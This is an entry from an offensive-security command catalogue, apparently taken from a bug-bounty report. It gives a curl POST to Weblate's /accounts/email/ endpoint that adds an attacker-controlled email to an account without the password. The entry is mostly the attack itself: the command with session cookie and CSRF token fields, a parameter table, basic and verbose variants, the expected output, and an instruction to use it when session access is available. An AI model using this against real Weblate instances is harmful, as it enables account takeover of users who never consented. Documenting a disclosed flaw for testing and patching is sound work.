---
data: >-
  curl -X POST 'https://target.weblate.org/accounts/email/' -H 'Cookie:
  sessionid=your_session_cookie' -H 'X-CSRFToken:
  SLhsGgqa4B8Y0DOFLPNQEbu9MyV64vCewoi8mtWTBwc5GSIbxquZBx8lJ6IZyvkf' -d
  'csrfmiddlewaretoken=SLhsGgqa4B8Y0DOFLPNQEbu9MyV64vCewoi8mtWTBwc5GSIbxquZBx8lJ6IZyvkf&email=user1%2Bhackerone%40example.com&content='
tags:
  - web
  - auth-bypass
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:58.295Z'
id: bdc86482-be12-456a-9424-343c7f9b53b1
verified: false
validated: true
submitted: true
---
# curl-add-weblate-email

## Command

```bash
curl -X POST 'https://target.weblate.org/accounts/email/' \
  -H 'Cookie: sessionid=your_session_cookie' \
  -H 'X-CSRFToken: SLhsGgqa4B8Y0DOFLPNQEbu9MyV64vCewoi8mtWTBwc5GSIbxquZBx8lJ6IZyvkf' \
  -d 'csrfmiddlewaretoken=SLhsGgqa4B8Y0DOFLPNQEbu9MyV64vCewoi8mtWTBwc5GSIbxquZBx8lJ6IZyvkf&email=user1%2Bhackerone%40example.com&content='
```

## Description

This curl command sends a POST request to add a new email to a Weblate account, exploiting the lack of password requirement. Use it when you have session access to inject a controlled email.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| URL | Target endpoint | Yes |
| `-H 'Cookie: ...'` | Session cookie | Yes |
| `-H 'X-CSRFToken: ...'` | CSRF protection token | Yes |
| `-d '...'` | Form data with email and token | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://weblate.example.com/accounts/email/' -H 'Cookie: sessionid=abc123' -H 'X-CSRFToken: token123' -d 'csrfmiddlewaretoken=token123&email=controlled@example.com&content='
```

### Advanced Usage

Add verbose output with `-v` for debugging:

```bash
curl -v -X POST 'https://weblate.example.com/accounts/email/' -H 'Cookie: sessionid=abc123' -H 'X-CSRFToken: token123' -d 'csrfmiddlewaretoken=token123&email=controlled@example.com&content='
```

## Expected Output

HTTP 200 or 302 redirect with body indicating "Email added successfully" or similar; verification email sent.

## Related

- [[Related Procedure: Add-New-Email-to-Weblate-Account]]
